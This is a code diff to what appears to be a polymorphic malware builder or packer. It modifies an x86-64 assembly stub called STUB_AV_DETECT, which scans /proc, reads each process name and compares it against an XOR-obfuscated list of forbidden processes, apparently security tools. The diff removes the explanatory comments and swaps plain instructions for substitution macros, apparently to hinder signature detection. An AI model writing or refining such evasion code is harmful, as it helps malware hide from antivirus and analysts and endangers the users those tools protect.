@@ -51,14 +51,12 @@ static const char STUB_POLY_DEMO_BLOCKS[] =
 
 static const char STUB_AV_DETECT[] =
 "_start:\n"
-    /* Réserve 4416 octets sur la pile par _DEC rsp (opcode 0x48 0xff 0xcc, ignoré par lde_step_c) */
 "_SET ecx, 4416\n"
 "alloc_stack_loop:\n"
 "_DEC rsp\n"
 "_DEC ecx\n"
 "jnz alloc_stack_loop\n"
 
-    /* r13 = rsp + 4096 */
 "_SET r13, rsp\n"
 "_SET ecx, 4096\n"
 "init_r13_loop:\n"
@@ -66,7 +64,6 @@ static const char STUB_AV_DETECT[] =
 "_DEC ecx\n"
 "jnz init_r13_loop\n"
 
-    /* r14 = r13 + 256 (soit rsp + 4352) */
 "_SET r14, r13\n"
 "_SET ecx, 256\n"
 "init_r14_loop:\n"
@@ -74,7 +71,6 @@ static const char STUB_AV_DETECT[] =
 "_DEC ecx\n"
 "jnz init_r14_loop\n"
 
-    /* sys_open("/proc", O_DIRECTORY) */
 "_SET rax, 2\n"
 "lea rdi, [proc_path]\n"
 "_SET rsi, 0x10000\n"
@@ -84,7 +80,6 @@ static const char STUB_AV_DETECT[] =
 "_SET r9, rax\n"
 
 "scan_loop:\n"
-    /* sys_getdents64 */
 "_SET rax, 78\n"
 "_SET rdi, r9\n"
 "_SET rsi, rsp\n"
@@ -93,7 +88,6 @@ static const char STUB_AV_DETECT[] =
 "cmp rax, 0\n"
 "jle exit_clean\n"
 
-    /* rbx = rsp + rax (nb octets lus) */
 "_SET rbx, rsp\n"
 "_SET ecx, eax\n"
 "init_rbx_loop:\n"
@@ -106,7 +100,6 @@ static const char STUB_AV_DETECT[] =
 "cmp rbp, rbx\n"
 "jge scan_loop\n"
 
-    /* r15 = rbp + 19 (d_name) */
 "_SET r15, rbp\n"
 "_SET ecx, 19\n"
 "adv_dname_loop:\n"
@@ -114,19 +107,17 @@ static const char STUB_AV_DETECT[] =
 "_DEC ecx\n"
 "jnz adv_dname_loop\n"
 
-    /* Filtre PID : d_name[0] dans ['0'..'9'] */
-"_ZERO rax\n"
-"mov al, [r15]\n"
+"xor eax, eax\n"
+"_SET al, [r15]\n"
 "cmp al, 48\n"
 "jl next_entry\n"
 "cmp al, 57\n"
 "jg next_entry\n"
 
-    /* Construire "/proc/<PID>/comm" dans r14 */
 "_SET rdi, r14\n"
 "lea rsi, [proc_prefix]\n"
 "copy_prefix:\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
 "je copy_prefix_done\n"
 "_STORE [rdi], al\n"
@@ -136,7 +127,7 @@ static const char STUB_AV_DETECT[] =
 "copy_prefix_done:\n"
 "_SET rsi, r15\n"
 "copy_pid:\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
 "je copy_pid_done\n"
 "_STORE [rdi], al\n"
@@ -146,14 +137,13 @@ static const char STUB_AV_DETECT[] =
 "copy_pid_done:\n"
 "lea rsi, [comm_suffix]\n"
 "copy_suffix:\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "_STORE [rdi], al\n"
 "_INC rsi\n"
 "_INC rdi\n"
 "cmp al, 0\n"
 "jne copy_suffix\n"
 
-    /* Ouvrir /proc/<pid>/comm */
 "_SET rax, 2\n"
 "_SET rdi, r14\n"
 "_ZERO rsi\n"
@@ -162,7 +152,6 @@ static const char STUB_AV_DETECT[] =
 "jl next_entry\n"
 "_SET r10, rax\n"
 
-    /* Lire comm dans r13 */
 "_SET rax, 0\n"
 "_SET rdi, r10\n"
 "_SET rsi, r13\n"
@@ -170,7 +159,6 @@ static const char STUB_AV_DETECT[] =
 "syscall\n"
 "push rax\n"
 
-    /* Fermer /proc/<pid>/comm */
 "_SET rax, 3\n"
 "_SET rdi, r10\n"
 "syscall\n"
@@ -179,7 +167,6 @@ static const char STUB_AV_DETECT[] =
 "cmp rax, 0\n"
 "jle next_entry\n"
 
-    /* Terminer par '\0' et retirer '\n' */
 "_SET rsi, r13\n"
 "_SET ecx, eax\n"
 "add_rax_loop:\n"
@@ -191,7 +178,7 @@ static const char STUB_AV_DETECT[] =
 
 "_SET rsi, r13\n"
 "strip_newline:\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
 "je strip_done\n"
 "cmp al, 10\n"
@@ -203,7 +190,6 @@ static const char STUB_AV_DETECT[] =
 "_STORE [rsi], al\n"
 "strip_done:\n"
 
-    /* Comparer contre forbidden_list (XOR 42) */
 "_ZERO r8\n"
 "check_forbidden:\n"
 "lea rsi, [forbidden_list]\n"
@@ -216,7 +202,7 @@ static const char STUB_AV_DETECT[] =
 "jmp add_r8_check\n"
 "done_r8_check:\n"
 "_ZERO eax\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
 "je next_entry\n"
 
@@ -232,8 +218,8 @@ static const char STUB_AV_DETECT[] =
 "done_r8_cmp:\n"
 "_ZERO rcx\n"
 "strcmp_loop:\n"
-"mov al, [rdi]\n"
-"mov dl, [rsi]\n"
+"_SET al, [rdi]\n"
+"_SET dl, [rsi]\n"
 "cmp dl, 0\n"
 "je skip_xor\n"
 "xor dl, 42\n"
@@ -259,20 +245,19 @@ static const char STUB_AV_DETECT[] =
 "done_r8_skip:\n"
 "skip_forbidden_entry:\n"
 "_ZERO eax\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "_INC r8\n"
 "_INC rsi\n"
 "cmp al, 0\n"
 "jne skip_forbidden_entry\n"
 
 "_ZERO eax\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
 "je next_entry\n"
 "jmp check_forbidden\n"
 
 "next_entry:\n"
-    /* Lit d_reclen (uint16 little-endian à rbp+16) */
 "_SET rsi, rbp\n"
 "_SET ecx, 16\n"
 "adv_reclen_loop:\n"
@@ -280,10 +265,10 @@ static const char STUB_AV_DETECT[] =
 "_DEC ecx\n"
 "jnz adv_reclen_loop\n"
 "_ZERO rcx\n"
-"mov cl, [rsi]\n"
+"_SET cl, [rsi]\n"
 "_INC rsi\n"
 "_ZERO rax\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "_SET edx, 256\n"
 "_ZERO rdi\n"
 "mul_reclen_loop:\n"
@@ -308,7 +293,7 @@ static const char STUB_AV_DETECT[] =
 "_SET rsi, r13\n"
 "_ZERO rdx\n"
 "strlen_comm_loop:\n"
-"mov al, [rsi]\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
 "je strlen_comm_done\n"
 "_INC rdx\n"
